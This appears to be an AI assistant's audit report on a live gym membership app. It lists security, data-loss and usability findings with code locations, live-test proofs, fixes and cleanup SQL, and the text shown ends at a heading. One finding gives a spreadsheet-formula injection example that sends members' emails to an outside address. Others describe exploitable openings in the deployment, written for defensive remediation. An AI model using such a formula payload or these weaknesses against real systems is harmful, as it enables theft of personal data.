# Round 2: every screen read, a live test, and the live setup

Date: 2026-10-14, updated 2026-10-15 · Follows [MEMBERS_APP_AUDIT.md](MEMBERS_APP_AUDIT.md) and [COACH_OWNER_AUDIT.md](COACH_OWNER_AUDIT.md). The last items (email, push, jobs, production checks and a go-live checklist) are in [PRE_TESTING_CHECKLIST.md](PRE_TESTING_CHECKLIST.md); their findings are R39 to R46 here.

You asked for three things the first pass did not do properly: read every screen line by line, test the running app, and audit the live setup. This document is what that found. Anything already in the two earlier documents is not repeated unless this round confirmed or corrected it.

**No application code or configuration was changed.** The live database was changed in one place, a test member's data (see "What I changed").

## What was done, and what was not

| Part | What I did | Limits |
|---|---|---|
| Screens | Read every file under `app/dashboard/_components`, `app/coach`, `app/owner` and the shared `app/_components` they use: all pages, hub shells, panes, sheets, forms, and the data functions behind them. This replaces the "only skimmed" lists in both earlier reports. | Reading is not running. Items marked **read in code** have not been reproduced. |
| Live setup | Read-only, with the stored keys. Supabase: auth settings, bucket settings, row counts, what a logged-out caller and a member can read. Vercel: project settings, environment variable **names**, deployments, response headers. No secret value was printed or written anywhere. | |
| Live test | The in-app browser against the **live** Supabase project (the local dev server points at it). First as the seeded test member Linda Williams on a phone-sized screen: I logged food, used the check-in, scanned every main tab for accessibility, and read the server log of what each tap cost. Later, once you signed in as an owner, I went through both owner tabs and the owner role checks, read-only. Then, signed in as the coach Brad, I went through the dashboard, Clients, one member's page and Credits tab, Classes (Sessions and Timetable), Library, Business, Messages and Broadcasts, and Settings, again without saving anything. Items marked **confirmed live** were reproduced this way. | Member, owner and coach screens. Deliberately **not** touched on the coach side because merely opening them writes or changes data: the Red Flags tab and stepping back through its weeks (RF1), the "Add client" popover (it creates the coach's sign-up link on first view), Messages on a wide screen (marks the newest conversation read, R29), the gym switcher, and anything that sends or saves. |

## Blocked, and what I need from you

1. **Write tests on the coach side.** Creating throwaway accounts was refused by the permission system and I did not work around it. The owner and coach screens were tested live because you signed in yourself. On 15 Oct you approved the proofs on throwaway data, and I ran **R3, R4 and R5** (all confirmed; see their sections), using Brad's coach session and your own test member Brad Stein. R25 and R33 were left as code-only findings on purpose: proving them leaves a sent broadcast and a group that cannot be deleted without SQL.
   - Also refused: using the owner's browser session to read row counts through the database API (it needed the public API key copied out of `.env.local`). That would have shown exactly what an owner login can read (R33, CM7). Say if you want that run another way.
2. **Still not proven live:** H1 (member edits the exercise library), H2 (member books without paying) and CM5 (upload to the public bucket). They need a raw database call as a member, with the project's public API key, which I was blocked from handling. I wrote [docs/audit-proofs/member-api-proofs.mjs](audit-proofs/member-api-proofs.mjs) for you to run yourself as a seeded test member; it makes three small writes, undoes what it can, and refuses to run on a non-test address. Read it before running it.
3. **Decide on the 219 test accounts** (R6). They are in your live project.

## What I changed (clean-up needed)

- **Test member Linda Williams** (a seeded account attached to a real coach). Her daily log for 15 Oct (her time) was left with food at 0 / 0 / 0 and 7 hours of sleep, from my tests. The app itself cannot clear these (R12). To reset, run in the Supabase SQL editor:
  `update daily_logs set protein = null, carbs = null, fat = null, sleep = null where id = '48ff2ffb-2a5f-44f5-875a-169dde8a97f4';`
- Earlier in the session I created one empty gym to try the create-coach script and deleted it again (verified: the project is back to the two real gyms).
- **The R3 proof (15 Oct):** I created a throwaway form "ZZ AUDIT PROOF (delete me)", assigned it to your test member Brad Stein, had him answer it, edited it, and then deleted it. The database is back to its earlier counts. **One leftover:** the assignment sent Brad Stein an in-app notification ("fill out: ZZ AUDIT PROOF") that remains in his bell. To remove it: `delete from notifications where message ilike '%ZZ AUDIT%';`
- **The R4 proof:** opening John Harris's chat marked his conversation read; I set it back to unread and both seeded threads show unread as before. No message was sent.
- Nothing else. No messages were sent (a chat message from a test member would have notified a real coach, so I avoided chat). Before the proofs I changed nothing in the owner and coach sessions: I opened the form editor and the Change-plan sheet and closed both without saving, and switched the broadcast audience buttons without sending.

## Corrections to the earlier reports

- **CSV formula protection** (COACH_OWNER_AUDIT, CM7 and "Checked and sound"): I wrote that the roster CSV export blocks spreadsheet formulas. That was wrong. There are two CSV helpers and the roster uses the one without protection. See R24. I have corrected both sentences.
- **M9 timezones:** live, both gyms are on `Europe/London`, so the gym half of M9 is already fixed. What remains is the column default and the 219 seeded members on `Pacific/Auckland`.
- **M13 secrets:** `CRON_SECRET` and `PUSH_WEBHOOK_SECRET` are set in production, so the "unset secret" case is not live.
- **"Not covered" lists** in both reports are replaced by the table above.

## Summary of new findings

| ID | Severity | Finding | Basis |
|---|---|---|---|
| R1 | High | Public sign-up is switched on, so every "any logged-in user" weakness is open to anyone on the internet | Live setting |
| R2 | High | Production has no email sender configured; member emails cannot be delivered | Live setting |
| R3 | High | Editing a form deletes every answer ever submitted to it (including the health questionnaire) | **Confirmed live** |
| R4 | High | Coach inbox can show one member's conversation under another's name, and the reply goes to the wrong member | **Confirmed live** |
| R5 | High | "Start a programme" defaults to the whole gym, one tap, no confirmation; a failed start still runs overnight | Default and wording confirmed live; failure path read in code |
| R38 | High | A coach whose active gym is not their members' gym sees "No plan" for every member, the wrong timetable, 0% class fill and the wrong gym's data. This is Brad's state right now | Confirmed live |
| R6 | Medium | 219 test accounts in the live project with a shared password, attached to real coaches | Live data |
| R7 | Medium | No two-factor on the coach and owner accounts that can see all member health data | Live setting |
| R8 | Medium | Vercel Hobby plan, once-a-day jobs, no version-skew protection, no custom domain | Live setting |
| R9 | Medium | A logged-out request to `daily_logs` times out after 3 s; large reads are already slow | Confirmed live |
| R10 | Medium | UK member health data is hosted in the US | Live setting |
| R11 | Medium | Quick Add "calories only" entries are missing from Today, Weekly Log, Insights and the coach's view | Confirmed live |
| R12 | Medium | Check-in sliders record 0 when tabbed onto; the screen says "Not logged" while the database says 0; a logged value cannot be cleared | Confirmed live |
| R13 | Medium | Every save re-renders the whole dashboard (3 s in dev); coach pages take 5 to 10 s with 90 members | Confirmed live |
| R14 | Medium | Weekly Log: weeks older than 12 weeks open blank, and saving overwrites the real data | Read in code |
| R15 | Medium | Setup saves the whole profile from a stale copy and can revert coach changes or fail with a cryptic error | Read in code |
| R16 | Medium | Referral link is the same Salford Quays link for every member; the FAQ states stale rules | Read in code |
| R17 | Medium | Class check-in window is 2 minutes before to 15 after, in the UI only | Read in code |
| R18 | Medium | A second member on a shared browser gets no push notifications | Read in code |
| R19 | Medium | Insights can show a nonsense "maintenance calories" figure and tell the member to ask their coach | Read in code |
| R20 | Medium | Coach views mark a photo-diary day or completed form "reviewed" just by being opened | Read in code |
| R21 | Medium | Phone back gesture with the add-food sheet, edit sheet, scanner or a confirm open leaves the screen instead of closing the sheet | Read in code |
| R22 | Medium | Onboarding keeps answers only in memory, has no privacy or consent step, and no way out | Read in code |
| R23 | Medium | A workout-library image link is loaded on every member's workout screen (extends H1) | Read in code |
| R24 | Medium | CSV exports: the roster, exercise library and class reports are not protected against spreadsheet formulas | Read in code |
| R25 | Medium | Broadcast "Send now" asks for confirmation only for "Whole gym" | Read in code |
| R26 | Medium | Editing a session that already has bookings: no warning, no member notice, no capacity check | Read in code |
| R27 | Medium | The Credits tab "Show all" shows only the latest 12 rows | Read in code |
| R28 | Medium | A coach in two gyms can act on the wrong gym from a stale tab | Read in code |
| R29 | Medium | Opening Messages silently marks the newest conversation read; a member's first message does not appear live | Read in code |
| R30 | Medium | Owner screens: the headline numbers are about 45 times the real ones (test accounts), a misleading month comparison, developer text on any error | Confirmed live and read in code |
| R31 | Medium | Event capacity is enforced only in the app; edit and delete do not tell signed-up members | Read in code |
| R32 | Medium | "Whole gym" client list shows colleagues' active members as "Unmonitored / Never logged" | Read in code |
| R33 | Medium | A group used in any broadcast can never be deleted; private coach notes are author-only | Read in code |
| R34 | Low | Gym "last admin" rule exists only in the screen | Read in code |
| R36 | Medium | Red flags are filed under the coach's *active* gym, so a gym with no members shows 38 flagged and "All gyms" double counts | Confirmed live |
| R37 | Medium | The owner login is a read-only dashboard: no member data, no password or settings, no coach assignment, and no way to sign out on a phone; the database grants far more read access than any screen uses | Confirmed by you; read in code |
| R39 | Low | Migration `0113` adds phone-push tables and a function for a phone app that is not part of this project; nothing sends to them | Read in code, live table empty |
| R40 | Medium | Coaches get no push or email when a member messages them | Read in code |
| R41 | Medium | Push failures are swallowed and counted nowhere; chat sending waits for push | Read in code |
| R42 | Low | Push sender identifies itself with a personal Gmail address | Live setting |
| R43 | Low | The sign-in page loads 1.15 MB of JavaScript and CSS | Confirmed live (production) |
| R44 | Low | Icons and splash images are re-checked on every launch; no iPad splash | Confirmed live (production) |
| R45 | Info | Scheduled jobs are healthy | Confirmed live |
| R46 | Low | The reminder job runs for 219 test accounts | Confirmed live |
| R35 | Low | Test content visible to every member now ("Next event: test") | Live data |
| LR | Low | Lists of smaller items for member and coach screens | Mixed |

---

## High

### R1. Public sign-up is open (live setting)

- **Where:** Supabase Auth settings, `disable_signup = false`; only the email provider is on and email confirmation is required.
- **What:** anyone who has the public API key (it is in every page of the app) can create an account and become a logged-in user with no profile. The app never calls `auth.signUp` (checked: no occurrence in `app/` or `lib/`; the join link uses the admin API), so closing this costs nothing.
- **Why it matters:** the earlier reports list several weaknesses that only need "a logged-in user": H1 (edit or delete the shared exercise library), M12 (insert into foods), CM5 (upload any file, any size, to the public `coach-branding` bucket). With sign-up open those are reachable by anyone on the internet, not just your members. I found no sign of abuse so far (all 474 library rows have no author; no bookings without a charge).
- **Fix:** Supabase dashboard, Authentication, Providers, Email: turn off "Allow new users to sign up". Then the join-link flow, which creates users with the admin key, keeps working. Do this first; it is a setting, not code.

### R2. Production cannot send email to members (live setting)

- **Where:** Vercel production environment. `RESEND_API_KEY` is set; `RESEND_FROM_EMAIL` is **not**. `lib/email.ts:14` then falls back to Resend's shared sandbox sender (`onboarding@resend.dev`), which only delivers to the Resend account owner's own address. The code comment on that line says so.
- **What:** every email the app sends to members (broadcasts with the Email or Both channel, and the birthday emails) will be rejected by Resend for anyone but that one address. CM1 in the coach report then makes it worse: failures are recorded as "email sent", so the coach is told it went.
- **Also affected:** the member's "Email your coach" button. It reports "The email did not go through" for every coach except the one whose address owns the Resend account, so testers will see it failing. Password-reset emails are **not** affected: they use Supabase's own mailer, and four real accounts have used them successfully (the latest on 14 Oct).
- **Fix:** verify a sending domain in Resend, set `RESEND_FROM_EMAIL` in Vercel (production), redeploy, and fix CM1 so a failure shows as failed. Until then do not rely on email broadcasts; the in-app message and push work. The Resend key in the project can only send, which is good practice, so I could not read the domain's status: check it in the Resend dashboard (see [PRE_TESTING_CHECKLIST.md](PRE_TESTING_CHECKLIST.md)).

### R3. Editing a form deletes every answer ever submitted to it

- **Where:** `lib/data/forms.ts:73-109` (`updateFormTemplate`); `supabase/migrations/0008_onboarding_forms.sql:92` (`form_responses.question_id references form_questions(id) on delete cascade`, never changed since).
- **What:** saving a form deletes all of its questions and inserts new ones with new ids (the code comment calls this "replaced wholesale"). The cascade removes every response that pointed at the old questions. Fixing a typo, reordering, or adding one question therefore erases all answers members have already given. The assignment still says "Completed", so the coach sees a completed form with nothing in it. The delete and the re-insert are not in one transaction either, so a failure in between leaves the form with no questions. Forms are gym-wide, so any coach's edit wipes every coach's members' answers.
- **Confirmed live (15 Oct), on a throwaway form.** I created "ZZ AUDIT PROOF" with one question and assigned it to your test member Brad Stein, who answered it (1 answer saved; the assignment showed completed). I then opened the form as the coach, changed one word of the question and pressed Save. Afterwards: the question had a **new id** (`aa67101b` became `c105e83e`), the assignment **still said completed**, and the answer count went **from 1 to 0**; the project-wide total went from 4 back to 3. Then I deleted the form, and the database is back to exactly its earlier counts (1 assignment, 22 questions, 3 forms, 3 answers).
- **Impact today:** only 3 answers exist on the live project (all Brad Stein's, on the real "Client Intake" form, which I did not touch), so almost nothing is lost yet. That changes the moment new members complete the intake form (it is auto-assigned to every new member) or the PAR-Q.
- **Fix:** update questions in place (match by id, insert new ones, mark removed ones inactive instead of deleting), or version the form so old answers keep their questions. Until fixed: **do not edit any form that members have already filled in.** Create a new one instead.

### R4. Coach inbox can show the wrong member's conversation and send the reply to someone else

- **Where:** `app/coach/_components/useCoachMessages.ts` (`selectClient`); `MessagesHubShell.tsx` and `MessagesDrawer.tsx` (they mount `<ChatTab key={selected} initialMessages={messages}>`); `ChatTab.tsx:133` (`useState(initialMessages)`, never re-synced).
- **What:** click member A, then member B before A's messages have loaded (slow connection, or just fast clicking). A's response arrives after B is selected and is stored as "the messages". B's chat window then opens with A's messages. When B's own messages arrive, the open chat ignores them. The header and the send box belong to B, so the coach reads A's thread under B's name and a reply meant for A goes to B. That is health and personal information reaching the wrong member.
- **Fix:** in `selectClient`, drop a result whose `clientId` is no longer the selected one (compare against `selectedRef`), and set `selected`, `messages` and `loading` together. A `key` that includes a load counter on `ChatTab` is a second safety net.
- **Confirmed live (15 Oct), signed in as the coach, on two seeded test members.** I clicked Barbara Scott's conversation, went back, and clicked John Harris's, 120 milliseconds apart (no network trick needed: server requests run one at a time, so the first answer always lands after the second click). The chat window headed **"John Harris"** showed **two** messages, including the coach reply "On it, will take a look today!". That reply belongs to Barbara's thread; John has one message in the database. The send box was John's. I did not send anything, and I set both threads back to unread afterwards.
- **Until fixed:** wait for each conversation to load before opening another.

### R5. "Start a programme" can replace everyone's programme in one tap

- **Where:** `app/coach/library/_components/ProgramTemplateManager.tsx` (the "Start this programme" sheet); `lib/data/programTemplates.ts:435-470` (`scheduleProgrammeRollout`); `apply_programme_rollout` (migration `0094`).
- **What (1):** the sheet opens with **Everyone at the gym** selected and a start date of **today**, and the main button reads "Start for everyone today". There is no confirmation and no member count. Choosing it gives every client in the gym, including other coaches' members, the template as their current programme at once. Old programmes and logged weights are kept, but every member's workout screen changes straight away and nobody is told.
- **Confirmed live (15 Oct), by looking only:** I opened the sheet on the "Weeks 9-11" template. "Everyone at the gym" was the highlighted choice, the start date was today (15/10/2026), and the main button read **"Start for everyone today"**, with no member count and no warning. I closed it without starting anything (starting it in Worsley could reach Brad's 90 members because of R38).
- **What (2):** the function first saves the rollout and then applies it. If applying fails the coach sees "Could not start that programme", but the saved rollout stays queued; the 03:15 UTC `apply-programme-rollouts` job applies it overnight.
- **Fix:** default to "Choose members"; when "Everyone" is picked, show the count and ask for confirmation; delete the queued rollout when the immediate apply fails (or do both in one database function).

---

### R38. A coach's screens follow their *active gym*, not their members' gym (Brad's data is wrong right now)

- **Confirmed live, signed in as Brad.** Brad works in both gyms and his active gym is **Worsley**, but all 90 of his members belong to **Salford Quays** (so do 224 of the 225 members in the project, and the other has no gym at all). What his screens show:
  - **Clients:** every one of the 90 shows "No plan" and the filter says "No plan · 90". In the database 63 of them have an active plan, all of them Salford plans. The plan name comes from a table that each gym can only read its own rows of, so Salford's plans are hidden from him.
  - **Clients, Whole gym:** "No clients at this gym yet", while "My clients" shows 90.
  - **A member's page:** "No plan set up", yet the same screen offers "End now" and "Ends Mon 2 Nov". The plan history reads just "Plan".
  - **Dashboard:** "Today · 8 sessions, all 0/12" are Worsley's classes, so "0% average class fill" and "sessions attended 32 fewer than last week" describe the wrong gym. "Red flag follow-ups: 38" are his Salford members filed under Worsley (R36).
  - **Business, Library, Plans:** Worsley's figures (0 members), Worsley's one programme template, Worsley's one form, Worsley's three plans.
  - **Broadcasts:** "Whole gym" says "This will message 90 clients" at a gym with none.
  - **Change plan** on a Salford member lists only Worsley's three plans.
  - **Forms cross gyms too (confirmed live, 15 Oct):** as Brad, with Worsley active, I assigned a Worsley form to a Salford member and it was accepted.
  - **Content already landing in the wrong gym.** The newest programme block, "Weeks 9-11" (3 weeks, 192 exercises), lives in **Worsley**, while "September Weeks 1-4" and "October Weeks 5-8" live in Salford. It was most likely built while Brad's active gym was Worsley. Salford's other coaches (the `adam@` and `quays@` logins) cannot see or use it.
- **It is also a way to put a member on the wrong gym's plan.** `start_membership` (`0088_membership_panel.sql:62`) checks that the caller coaches the member but never that the plan belongs to the member's gym. Pick a Worsley plan for a Salford member and it is accepted, with Worsley's credits and screens.
- **Root cause:** gym-scoped data (plans, classes, templates, forms, events, groups, red flags) is selected with the coach's active gym (`my_gym_id()`, stored on their profile), while the coach-to-member link is not gym-scoped. A coach in two gyms is only correct while their active gym happens to match the members they are looking at. R28 and R36 are two more symptoms.
- **Fix now:** have Brad switch to Salford Quays (Settings, Gym, Your gyms). That makes his screens correct until he switches back.
- **Fix properly:** screens about a member (plan name, change-plan list, credits, red flags, broadcast audience) should use the **member's** gym; `start_membership` and the class-booking functions should refuse a plan or class from another gym; show the active gym prominently, and warn when a coach's members belong to a different gym.

## Medium: live setup and data

### R6. 219 test accounts are in the live project

- 219 of the 231 login accounts are `smoke-…@example.com`, created by `scripts/seed-smoke-fleet.ts` with one shared password. They are attached to your real coaches, 218 have not finished onboarding, and they sit on `Pacific/Auckland`.
- **Effects:** they inflate the owner Overview member counts (R30), appear in every coach's "Whole gym" list, and a "Whole gym" broadcast would try to email 219 `example.com` addresses (bounces, which hurts your email sender reputation once R2 is fixed). Anyone who knows the password can sign in as a member.
- **Fix:** run the script's `--cleanup` option once testing is finished. Never commit the script with the password in it; add an environment guard so seed scripts cannot run against the live project (CM8).

### R7. No two-factor authentication on coach or owner accounts

- None of the 2 owners and 4 coaches has a second factor enrolled. These accounts can read every member's health notes, forms, meal photos and (for assigned coaches) chat and progress photos. Enable TOTP in Supabase Auth and require it for coach and owner roles. (Also relevant to H3: your privacy policy should say how staff access is protected.)

### R8. Vercel plan and deployment settings

- **Hobby plan** on a commercial gym app. Hobby is for non-commercial use and limits cron jobs to once a day, which is why scheduled broadcasts can be a day late (CM1).
- **Skew protection is off.** Every push to `master` deploys (five today). A member who left the app open across a deploy still runs the old JavaScript; their next action can fail with "Failed to find Server Action" until they reload. The app has no "new version available" banner, and the service worker only updates when `sw.js` itself changes.
- **No custom domain**: the app is served from `central-hub-eta.vercel.app`. Members install the app from that name; changing it later means they reinstall.
- **Fix:** Pro plan, turn on skew protection, add a domain before more members install, add an update banner.

### R9. A logged-out request to `daily_logs` runs for 3 seconds and fails

- A request with only the public key (no login) for `daily_logs` returns an error after about 3.1 seconds (statement timeout) instead of an immediate "no rows". The table's access rules are not limited to logged-in users, so the database evaluates them row by row before refusing. Anyone can repeat that call cheaply and tie up database time.
- The same cost shows for members: an unfiltered count of `daily_logs` (3,217 rows) took 4.6 s; with a member filter, 74 ms. Today's app always filters, so users do not notice, but it will not scale.
- **Fix:** add `to authenticated` to the policies, and index the columns the access rules use. Put this in the same migration as H1 and H2.

### R10. Hosting location

- The app's functions run in `iad1` (Virginia, US East) and requests from the UK cost 70–95 ms to the database, which suggests the Supabase project is in the US too (check its region in the dashboard). Measured again on 15 Oct: Cloudflare's edge for the project is in London, yet five requests took 91 to 123 ms each from this machine, which a London database would not. UK members' health data stored and processed in the US needs to be covered in your privacy policy and processor terms (UK GDPR). If the project can be recreated, `eu-west-2` (London) is the better home for a UK gym.

### R35. Test content that every member can see

- One gym event titled **test** (23 Oct) shows as "Next event: test" at the top of every member's Home screen.
- Program templates "Test" and "test 2" sit in the Library; two courses are both called "Education Library"; "Premium" and "8/week Unlimited" have no members.
- **Worsley's copy of the challenge plan is set up differently from Salford's.** Worsley's "6 week challenge" has no length (Salford's "6 Week Challenge" is 6 weeks) and does not include the daily check-in screen, which the Add-package form adds automatically for any plan with a length. A member put on it would stay on it indefinitely with no check-in.
- **The only default onboarding form is a sample.** Worsley's default "Client Intake" has three questions, and "Which days can you train?" has a single option, "Mon, Wed, Fri". Salford has the PAR-Q and the Lifestyle form but **no default**, so a new Salford member is not given any form automatically.
- Delete or rename the test items, and review the plan and form set-up for each gym.

---

## Medium: confirmed live in the member app

### R11. Quick Add "calories only" entries do not count anywhere except the Food screen

- **Confirmed live.** I added a Quick Add of 300 kcal with no macros. The Food screen showed 300 kcal. The Coach tab's "Today's targets" ring showed **0**. The database held `quick_add_calories = 300` on the food entry and 0 / 0 / 0 on the day's log. Calories everywhere else (Today, Weekly Log averages, Insights, streaks, the coach's overview) are worked out from protein, carbs and fat only, so they never see it.
- **Where:** `lib/data/foodDiary.ts` (`syncFoodDiaryToLog` writes macros only); `FoodTrackingTab` uses `quick_add_calories` as entered.
- **Fix:** either store estimated macros for a calories-only entry, or give `daily_logs` a calories column that includes it and use that everywhere. Until then, tell members to give at least a rough protein figure.

### R12. Check-in sliders: tabbing records 0, and a logged value cannot be removed

- **Confirmed live.** Pressing Tab to move keyboard focus onto the Sleep slider wrote `sleep = 0` to the database (seen in the server log and the table). The screen still said "Not logged", while coach screens count 0 as a real value (the day shows as logged, sleep traffic light red, averages lowered). Touching the slider without moving it does the same (`AccountabilityTracker.tsx` saves on any key-up or pointer-up).
- **Also confirmed live:** typing 7 in the Sleep box saved 7. Clearing the box and leaving it put 7 back, in the screen and in the database. A wrong figure can be changed but never un-logged.
- **Fix:** save sliders only when the value actually changes; treat a cleared box as "not logged" (null) and save that; show "0" honestly if 0 was recorded.

### R13. Every save re-renders the whole dashboard

- **Confirmed live** from the server log (dev mode, so absolute times are pessimistic): each action pays 60–390 ms in the sign-in check (`proxy.ts`) before it starts; adding a food is two requests (about 0.9 s and 0.26 s); and each check-in or diary save is followed by a full `GET /dashboard` of 3.0–3.4 s, which reloads the whole 40-query, 300 KB bundle (H5, M1). Typing in the notes box saves on every blur and does this each time.
- **Coach pages, measured live on the dev server against the live database (90 members):** `/coach` 6.2 to 6.6 s, `/coach/clients` 4.6 to 5.7 s, and opening **one member's page 10.1 s** (7.8 s of it in the app's own data loading). That page loads the whole 40-query member bundle plus every member's health status and every chat thread, then keeps one row of each (CP1, SP1). The Clients page puts about 2,900 elements and 345 KB of HTML on the screen for 90 rows with no paging; at 1,000 members that is about 3.8 MB. Production is faster than the dev server, but the shape is the same and your members are 70 to 95 ms from the database (R10).
- **Fix:** return the saved row from the action and update local state; reserve `router.refresh()` for structural changes. This is also the biggest lever on the Supabase bill. For the coach pages, load only the one member's row and status, and page the Clients list.

### Confirmed live from the first report

| Earlier ID | What the live test showed |
|---|---|
| M2 | After adding and deleting one food, the day's log stayed at 0 / 0 / 0, so the Weekly Log said "2 days of food logged" and halved the weekly average (482 kcal instead of 965) |
| M1 | First paint is blank until the app loads; the Home screen then has exactly one heading, the member's name |
| M11 | The only security header on production is HSTS; no CSP, frame, referrer or content-type headers |
| H3 | `/legal/terms` redirects a logged-out visitor to login |
| H5 | The Supabase row limit is 1,000 (a 56,857-row table returned 1,000 when 5,000 were asked for). No table is near it yet: largest chat thread 4 messages, most workout logs per member 30 |
| H1 / H2 | No sign of abuse: all 474 library rows have no author, and no booked class lacks a credit charge. The 4 accounts with negative membership balances are all seeded test accounts |
| CH4 | No member is currently over their plan's weekly allowance |
| RLS | A member could read **0** rows belonging to another member across 15 tables, and saw only their own profile; a logged-out caller got nothing from any table or private bucket |
| Role gates | A member's session gets only a redirect from every coach page and 403 from the three coach APIs |

Accessibility scan on the Home, Book, Coach, Profile and Check-in tabs (phone width): **no `<main>` landmark** on any screen, **one heading per screen** (the member's name), no unnamed buttons, no images without a description, one unlabelled text box on Check-in, and 31 touch targets under 32 px on Check-in. The Add-food sheet leaves the whole page behind it in the accessibility tree.

---

## Medium: member app, read in code

### R14. Weekly Log: old weeks open blank and saving overwrites real data

`WeeklyLogTab.tsx` builds past weeks from the last 84 days only. Go back further and the form is empty. Any save (a blur, a mood tap, the gym toggle) writes the whole non-food field set from that empty form, so the real stored bodyweight, steps, sleep and notes for that day are replaced with blanks. Navigation back is unlimited. **Fix:** fetch the day on navigation, or lock days older than the loaded window.

### R15. Setup saves the whole profile from a stale copy

`SetupTab.tsx:118,176` keeps the entire database row in the form and `upsertClientProfile` (`clientProfile.ts:20`) writes every column back. If the coach changes a plan setting, clears the review flag, or switches tracking mode while the member has Setup open (it is a PWA that stays open), the member's next save puts the old values back. If the coach changed the reminder days, join date or referral source, the `0110` guard rejects the save with "Not authorized to change coach-managed profile fields", which the member sees as a failure they cannot explain. Members can also edit `start_weight` and `goal_weight`, which feed the calorie engine and the progress baseline with no coach review. **Fix:** send only the fields the member changed, and extend the `0110` guard to the review and plan columns (see M10). Not reproduced live.

### R16. Referral link and FAQ

- `CommunityTabs.tsx` hard-codes `REFER_URL` to `ballisticperformancequays.co.uk/refer` (Salford Quays) for **every** member, including Worsley, and it is the same link for everyone, so no referral can be credited to the member who shared it. The wording says "your discount is already applied".
- The FAQ states rules that are now wrong or configurable: clubs at "100, 200, 300" (real: 100, 250, 500, then every 500), "progress is on Home under My progress" (that tab was removed in the latest commit), plan names and session counts that do not match your live plans, and the cancellation rule ("3 hours, 11 pm to 5 am") written as fixed text although the gym settings make it configurable. A comment in the file says the answers are drafts for review.

### R17. Class check-in window

`CheckInButton.tsx:21-22` only allows check-in from 2 minutes before a class to 15 minutes after. Early arrivals cannot check in; anyone more than 15 minutes late cannot at all, so attendance, session counts, clubs and rewards depend on the coach marking it. The server function allows any time on the day, so the two rules disagree. **Fix:** decide the rule, enforce it in `check_in_booking`, and make the button follow.

### R18. Push notifications on shared browsers

`PushPrompt.tsx` stops if the browser already has a subscription (`if (existing) return`). If member A subscribed on a family iPad and member B logs in later, B never gets their own subscription row and receives nothing, while A's row keeps delivering A's messages (with previews) to a device B is now using. Sharpens M3. **Fix:** on sign-in, replace the browser's subscription with the signed-in member's; on sign-out delete it.

### R19. Insights "maintenance calories"

`estimateAdaptiveTdee` (`lib/calculations.ts`) has no minimum time span. With five food days and two weigh-ins a day or two apart it extrapolates a tiny change to a daily figure and can produce a negative maintenance level, and the card then tells the **member** "N kcal off your plan, ask your coach to review". It also counts zero-calorie logged days (R11, M2). **Fix:** require 14 days between weigh-ins and a minimum number of food days, and clamp the result to a sensible range; show the card to coaches only until it is trusted.

### R20. Looking at something marks it reviewed

`PhotoDiaryTab.tsx` marks a photo-diary day reviewed for the coach as soon as the day is opened (including while paging through days), and a coach expanding a completed form marks it reviewed too. That clears the coach's to-do items without any feedback having been given. **Fix:** mark reviewed on an explicit action.

### R21. Back gesture closes the screen, not the sheet

The Add-food sheet, the food-entry edit sheet, the barcode scanner and the shared confirm dialog do not register with the app's back-button handler (the other sheets and photo viewers do). On a phone, Android back or the iOS swipe runs the dashboard's back logic and leaves the screen underneath, losing what was typed or scanned. **Fix:** register all four with `useBackHandler`.

### R22. Onboarding

State lives only in React: a refresh, a phone eviction or a call mid-way loses all five steps of answers. There is no privacy notice or consent step although it collects health notes and an emergency contact's details, and it accepts ages from 10 (M8, H3). There is no sign-out or escape (CH3). The short flow (chosen whenever a profile row already exists) never asks height, weight or plan, so a member can finish with no targets. **Fix:** save as each step completes; add a consent step with a link to the real privacy policy once written.

### R23. Library image links on every member's workout screen

`ExerciseEditor.tsx` (`MemberExerciseRow`) loads the library entry's `image_url` as an `<img>` from any website on every member's workout screen. Because the library can be edited by any logged-in user (H1, R1), one edit can make every member's phone contact an address of the editor's choice (IP address and device exposure). **Fix:** the H1 policy change, plus restrict `image_url` to your own storage or an allowlist, and add a Content-Security-Policy (M11).

---

## Medium: coach and owner screens, read in code

### R24. CSV exports are not protected against spreadsheet formulas

- **Where:** there are two CSV helpers. `lib/csv.ts` prefixes cells that start with `=`, `+`, `-` or `@`. `lib/utils/csv.ts` does not. The clients roster export (`ClientTable.tsx:10`) and the exercise library export (`ExerciseLibraryManager.tsx:23`) use the unprotected one, and `app/coach/classes/_components/ReportsPane.tsx` has its own unprotected copy for the no-show and class-popularity downloads. The Peak Week export and the owner reports use the protected one.
- **Why it matters:** a member chooses their own display name. If it starts with `=`, a coach who exports the roster and opens it in Google Sheets or Excel runs the member's formula (for example `=IMAGE("https://…/?d="&B2&B3)` sends other members' emails from that sheet to an outside address). The exercise library names can be set by any logged-in user (H1).
- **Fix:** delete the unprotected helper and import `lib/csv.ts` everywhere; add a byte-order mark so accented names open correctly in Excel.

### R25. Broadcast "Send now" confirms only for the whole gym

`BroadcastsPane.tsx:159` asks for confirmation only when the audience is "Whole gym". "My clients" or a group, with channel Email or Both, sends on one click: no count in a confirmation, no send-to-me test, no recall. The "This will message N clients" figure counts everyone on the roster (paused, ended, the 219 test accounts). After sending there is no delivery report (who, how many, failures). **Fix:** always confirm with the count and channel; add "send me a test"; show results.

### R26. Editing a session that has bookings

`TimetableView.tsx` saves a changed day, time, capacity or cancellation cut-off on a weekly slot without checking existing bookings. Moving a 6 am class to 7 am, or lowering capacity below the number booked, goes through silently and members are not told. (Deleting is covered by CH2.) One-off sessions can also be created in the past. **Fix:** show "N members are booked" before saving, refuse capacity below the booked count, notify members of a time change.

### R27. The Credits tab history is cut at 12 rows

`CreditsTab.tsx` offers "Show all N", but `getCreditHistory` returns only the latest 12 rows (`memberships.ts`, default `limit = 12`) and membership history is limited to 10. Each week's automatic reset adds a row, so after about three months manual grants and removals fall out of view, and "Show all 12" reads as complete. This is the screen a coach uses to answer "where did my credits go". **Fix:** paginate, and never label a capped list "all".

### R28. Acting on the wrong gym from a stale tab

A coach's active gym is stored on their profile (`switchActiveGym`) and every database rule uses it. Switch to Salford in one tab or device and a second tab still showing Worsley's timetable or clients now acts on Salford: "Add session", "Add credit pack", "Broadcast to whole gym" or "Create client" land in the wrong gym with no warning. Your two owners work across both gyms, so this is realistic, and R38 shows what it looks like in your data today even with one tab. **Fix:** send the gym id the page was rendered for with each write and refuse on mismatch; show the gym name on write forms.

### R29. Coach messages

- Opening `/coach/messages` on a desktop selects the first conversation, and the chat's open effect marks it read (`ChatTab.tsx:221-225`), so the newest conversation is marked read without the coach looking.
- The inbox only listens for new messages on conversations that already have one (`useCoachMessages.ts`, comment in the code). A member's **first ever** message does not appear live, and the default "active" filter hides empty conversations, so it is missing until a full reload.
- It opens one live channel per active conversation; a coach with more than about 100 will exceed Supabase's per-connection channel limit and older threads stop updating.
- The drawer shows "Loading…" forever if the overview request fails (no catch).

### R30. Owner screens

